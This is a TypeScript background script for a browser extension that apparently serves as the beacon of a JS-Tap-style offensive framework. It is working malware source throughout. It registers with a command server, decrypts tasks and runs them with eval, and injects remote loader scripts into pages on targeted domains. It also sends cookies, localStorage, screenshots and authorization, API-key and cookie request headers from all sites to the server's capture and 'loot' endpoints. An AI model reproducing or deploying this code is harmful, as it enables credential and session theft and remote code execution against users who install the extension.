
import { CONFIG } from '@/utils/config';
import { arrayBufferToBase64, base64ToArrayBuffer, importKey, encrypt, decrypt } from '@/utils/crypto';

export default defineBackground(() => {
  let sessionUUID: string | null = null;
  let sendKey: CryptoKey | null = null;
  let receiveKey: CryptoKey | null = null;
  let isInitializing = false;
  const messageQueue: Array<{path: string, message: any}> = [];

  async function register() {
    if (isInitializing) return;
    isInitializing = true;
    console.log("BEX: Registering...");
    const url = `${CONFIG.serverUrl}/client/getToken/${CONFIG.tag}/${CONFIG.clientType}`;
    
    try {
      const resp = await fetch(url);
      if (resp.ok) {
        const data = await resp.json();
        sessionUUID = data.clientToken;
        await browser.storage.local.set({ sessionUUID });
        console.log("BEX: Registered with UUID:", sessionUUID);
        await initKeys();
      }
    } catch (e) {
      console.error("BEX: Registration error:", e);
    } finally {
      isInitializing = false;
    }
  }

  async function initKeys() {
    if (!sessionUUID) return;
    console.log("BEX: Initializing keys...");
    try {
      const url = `${CONFIG.serverUrl}/client/metricSettings/${sessionUUID}`;
      const resp = await fetch(url);
      if (resp.ok) {
        const data = await resp.json();
        if (data.enable === "true") {
          const obfuscatedString = atob(data.metricDebug);
          const obfuscatedData = new Uint8Array([...obfuscatedString].map(c => c.charCodeAt(0)));
          
          const idHex = sessionUUID.replace(/-/g, '');
          const idBytes = new Uint8Array(
            idHex.match(/.{1,2}/g)!.map(byte => parseInt(byte, 16))
          );
          
          const shift = 7 % idBytes.length;
          const rotateBytes = new Uint8Array([
            ...idBytes.slice(shift),
            ...idBytes.slice(0, shift)
          ]);

          const masker = new Uint8Array(obfuscatedData.length);
          for (let i = 0; i < obfuscatedData.length; i++) {
            masker[i] = rotateBytes[i % rotateBytes.length];
          }

          const plaintextData = new Uint8Array(obfuscatedData.length);
          for (let i = 0; i < obfuscatedData.length; i++) {
            plaintextData[i] = obfuscatedData[i] ^ masker[i];
          }
          
          const receiveKeyData = plaintextData.slice(0, 32);
          const sendKeyData    = plaintextData.slice(32, 64);

          sendKey = await importKey(sendKeyData, ["encrypt"]);
          receiveKey = await importKey(receiveKeyData, ["decrypt"]);
          console.log("BEX: Keys initialized. Processing queue of", messageQueue.length, "messages.");
          
          // Confirm crypto capability to the server so it knows we can receive encrypted tasks
          fetch(`${CONFIG.serverUrl}/client/confirmCrypto/${sessionUUID}`);

          // Process queued messages
          const queueToProcess = [...messageQueue];
          messageQueue.length = 0;
          for (const queued of queueToProcess) {
            try {
              await sendEncrypted(queued.path, queued.message);
            } catch (e) {
              console.error("BEX: Failed to send queued message", e);
            }
          }
          
          // Immediate task check on startup/re-init
          checkTasks();
        }
      }
    } catch (e) {
      console.error("BEX: Key init error:", e);
    }
  }

  async function sendEncrypted(path: string, message: any) {
    if (!sessionUUID || !sendKey) {
      console.log("BEX: Keys not ready, queuing message for path:", path);
      messageQueue.push({ path, message });
      if (!isInitializing && !sessionUUID) register();
      return;
    }

    const iv = crypto.getRandomValues(new Uint8Array(12));
    const pathData = new TextEncoder().encode(path);
    const messageData = new TextEncoder().encode(JSON.stringify(message));

    const encryptedPath = await encrypt(sendKey, iv, pathData);
    const encryptedMessage = await encrypt(sendKey, iv, messageData);

    const payload = {
      metricData: [
        await arrayBufferToBase64(iv),
        await arrayBufferToBase64(encryptedPath),
        await arrayBufferToBase64(encryptedMessage)
      ].join(',')
    };

    return await fetch(`${CONFIG.serverUrl}/client/metrics/${sessionUUID}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }

  async function checkTasks() {
    if (!sessionUUID || !sendKey || !receiveKey) return;

    try {
      const resp = await sendEncrypted("/client/taskCheck", {});
      if (resp && resp.ok) {
        const jsonResponse = await resp.json();
        
        let tasks = [];
        if (jsonResponse.metricData) {
            // Encrypted response
            const metricData = jsonResponse.metricData;
            const parts = metricData.split(",");
            
            const ivBuffer = base64ToArrayBuffer(parts[0]);
            const cipherBuffer = base64ToArrayBuffer(parts[1]);

            const clearMessageBuffer = await decrypt(receiveKey, new Uint8Array(ivBuffer), new Uint8Array(cipherBuffer));
            const clearMessageText = new TextDecoder().decode(clearMessageBuffer);
            tasks = JSON.parse(clearMessageText);
        } else {
            // Unencrypted response (server hasn't seen confirmCrypto yet or crypto is disabled)
            tasks = jsonResponse;
        }

        console.log("BEX: Received tasks:", tasks.length);

        for (const task of tasks) {
          console.log("BEX: Processing task ID:", task.id);
          try {
            const rawData = atob(task.data);
            console.log("BEX: Raw task data:", rawData);
            // Check if it's a JSON configuration object
            if (rawData.trim().startsWith('{')) {
                const config = JSON.parse(rawData);
                if (config.type === 'CONFIG_INJECTION') {
                    console.log("BEX: Updating injection rule for domain:", config.domain, "Active:", config.active, "URL:", config.url);
                    const rules = await browser.storage.local.get('injectionRules');
                    const currentRules = rules.injectionRules || {};
                    
                    if (config.active) {
                        let finalUrl = config.url;
                        if (finalUrl.startsWith('/')) {
                            // Resolve relative URL against the beacon's known server URL
                            finalUrl = `${CONFIG.serverUrl}${finalUrl}`;
                        }
                        currentRules[config.domain] = finalUrl;
                    } else {
                        console.log("BEX: Removing injection rule for", config.domain);
                        delete currentRules[config.domain];
                    }
                    
                    await browser.storage.local.set({ injectionRules: currentRules });
                    console.log("BEX: Current injection rules:", currentRules);

                    // Immediate Action: If we just got an active rule, try to inject into matching tabs immediately
                    if (config.active) {
                        const tabs = await browser.tabs.query({});
                        for (const tab of tabs) {
                            if (tab.id && tab.url) {
                                const tabUrl = new URL(tab.url);
                                if (tabUrl.hostname === config.domain) {
                                    console.log("BEX: Found existing tab for new rule, injecting immediately:", tab.id);
                                    // Use the resolved finalUrl from currentRules
                                    injectIntoTab(tab.id, currentRules[config.domain]);
                                }
                            }
                        }
                    }
                    continue; // Skip eval
                }
            }
            
            // Fallback to standard eval for legacy tasks
            console.log("BEX: Executing legacy task via eval");
            eval(rawData);
          } catch (e) {
            console.error("BEX: Task execution failed", e);
          }
        }
      }
    } catch (e) {
      console.error("BEX: Heartbeat failed", e);
    }
  }

  async function injectIntoTab(tabId: number, scriptUrl: string) {
    // Helper to perform the actual script injection
    try {
        await browser.scripting.executeScript({
            target: { tabId: tabId },
            world: 'MAIN',
            func: (src) => {
                console.log("%c[BEX] MAIN world executing loader creation for: " + src, "color: #00ff00; font-weight: bold;");
                const script = document.createElement('script');
                script.src = src;
                script.async = true;
                script.onload = () => console.log("%c[BEX] JS-Tap script loaded successfully.", "color: #00ff00;");
                script.onerror = (e) => console.error("[BEX] JS-Tap script failed to load. Target URL likely blocked or 404.", e);
                (document.head || document.documentElement).appendChild(script);
            },
            args: [scriptUrl]
        });
        console.log("BEX: Injection successfully dispatched to tab", tabId);
    } catch (e) {
        console.error("BEX: [ERROR] Injection failed for tab", tabId, e);
    }
  }

  // Injection Listener
  browser.webNavigation.onCompleted.addListener(async (details) => {
    if (details.frameId === 0) { // Top-level frame
        const rules = await browser.storage.local.get('injectionRules');
        const currentRules = rules.injectionRules || {};
        
        const url = new URL(details.url);
        console.log("BEX: Navigation completed for", url.hostname, "Checking rules...");
        
        if (currentRules[url.hostname]) {
            const scriptUrl = currentRules[url.hostname];
            console.log("BEX: [MATCH] Target domain matched! Injecting loader:", scriptUrl, "into tab", details.tabId);
            injectIntoTab(details.tabId, scriptUrl);
        } else {
            console.log("BEX: No rule for", url.hostname, "Available rules:", Object.keys(currentRules));
        }
    }
  });

  // Setup
  browser.storage.local.get("sessionUUID").then(async (res) => {
    sessionUUID = res.sessionUUID;
    if (!sessionUUID) {
      await register();
    } else {
      await initKeys();
    }

    // Set up periodic task check with configurable interval
    console.log(`BEX: Starting heartbeat alarm with interval: ${CONFIG.heartbeatInterval}s`);
    browser.alarms.create("heartbeat", { 
      periodInMinutes: CONFIG.heartbeatInterval / 60 
    });
  });

  browser.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "heartbeat") {
      checkTasks();
    }
  });

  // Telemetry listener from content scripts
  browser.runtime.onMessage.addListener(async (message, sender) => {
    if (message.type === 'TELEMETRY') {
      const { domain, url, localStorage, sessionStorage, cookies } = message.data;
      console.log("BEX: Received telemetry for", domain);
      
      // Report domain/url visited
      sendEncrypted("/bex/report", { 
        visits: [{ domain, url }] 
      });

      // Report cookies found by content script
      if (cookies) {
        cookies.split(';').forEach((c: string) => {
          const [name, value] = c.trim().split('=');
          if (name && value) {
            sendEncrypted("/bex/capture", {
              domain,
              url,
              type: 'cookie',
              name,
              value
            });
          }
        });
      }

      // Report localStorage
      for (const [name, value] of Object.entries(localStorage)) {
        sendEncrypted("/bex/capture", {
          domain,
          url,
          type: 'storage',
          name,
          value: value as string
        });
      }
    } else if (message.type === 'TAKE_SCREENSHOT') {
      const { sessionUUID: implantUUID, isEncrypted } = message.data;
      
      // Critical Check: We can only capture the visible tab. 
      // If the requesting implant is in a background tab, capturing 'visible' will grab the WRONG site.
      if (!sender.tab?.active) {
        console.log("BEX: [SCREENSHOT] Skipped. Requesting tab is not active:", sender.tab?.id);
        return { success: false, reason: "background_tab" };
      }

      console.log("BEX: [SCREENSHOT] Capturing active tab for implant:", implantUUID);
      
      try {
        // Capture the visible area of the active tab
        const dataUrl = await browser.tabs.captureVisibleTab(undefined, { format: 'png' });
        
        // Convert dataURL to Blob/ArrayBuffer
        const resp = await fetch(dataUrl);
        const blob = await resp.blob();
        
        if (sendKey) {
          // Exfiltrate via our own encrypted metrics channel but tag it for the target implant
          const arrayBuffer = await blob.arrayBuffer();
          // We send to OUR metrics endpoint (sessionUUID is the beacon's here), 
          // but use a path that specifies the target implant.
          await sendEncryptedData(sessionUUID!, `/bex/screenshot/${implantUUID}`, arrayBuffer);
        } else {
          // Unencrypted exfil (fallback)
          await fetch(`${CONFIG.serverUrl}/loot/screenshot/${implantUUID}`, {
            method: 'POST',
            body: blob
          });
        }
        console.log("BEX: [SCREENSHOT] Successfully exfiltrated high-quality capture.");
        return { success: true };
      } catch (e) {
        console.error("BEX: [SCREENSHOT] Failed to capture or exfiltrate.", e);
        return { success: false, error: String(e) };
      }
    }
  });

  async function sendEncryptedData(targetUUID: string, path: string, data: ArrayBuffer) {
    if (!sendKey) return;

    const iv = crypto.getRandomValues(new Uint8Array(12));
    const pathData = new TextEncoder().encode(path);

    const encryptedPath = await encrypt(sendKey, iv, pathData);
    const encryptedMessage = await encrypt(sendKey, iv, new Uint8Array(data));

    const payload = {
      metricData: [
        await arrayBufferToBase64(iv),
        await arrayBufferToBase64(encryptedPath),
        await arrayBufferToBase64(encryptedMessage)
      ].join(',')
    };

    return await fetch(`${CONFIG.serverUrl}/client/metrics/${targetUUID}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }

  // Header capture logic
  const INTERESTING_HEADERS = ['authorization', 'x-api-key', 'cookie', 'set-cookie'];
  const captureCache = new Map<string, number>();

  browser.webRequest.onSendHeaders.addListener(
    (details) => {
      if (!details.requestHeaders) return;
      const url = new URL(details.url);
      const domain = url.hostname;
      const currentUrl = details.url;

      // Domain scoping check for background capture
      if (CONFIG.domainScoping.mode === 'whitelist') {
        const isWhitelisted = CONFIG.domainScoping.whitelist.some(pattern => {
          const regex = new RegExp(pattern.replace(/\*/g, '.*'));
          return regex.test(currentUrl);
        });
        if (!isWhitelisted) return;
      }

      details.requestHeaders.forEach(header => {
        const headerName = header.name.toLowerCase();
        if (INTERESTING_HEADERS.includes(headerName)) {
          const value = header.value || '';
          // Create a unique key for this capture
          const cacheKey = `${domain}:${headerName}:${value}`;
          const now = Date.now();
          
          // Only send if we haven't seen this exact capture in the last 60 seconds
          if (!captureCache.has(cacheKey) || (now - captureCache.get(cacheKey)! > 60000)) {
            captureCache.set(cacheKey, now);
            
            // Clean up cache if it gets too big
            if (captureCache.size > 1000) {
                const oldest = now - 60000;
                for (const [k, v] of captureCache.entries()) {
                    if (v < oldest) captureCache.delete(k);
                }
            }

            sendEncrypted("/bex/capture", {
              domain,
              url: currentUrl,
              type: 'header',
              name: header.name,
              value: value
            });
          }
        }
      });
    },
    { urls: ['<all_urls>'] },
    ['requestHeaders']
  );

  console.log("BEX Background loaded.");
});
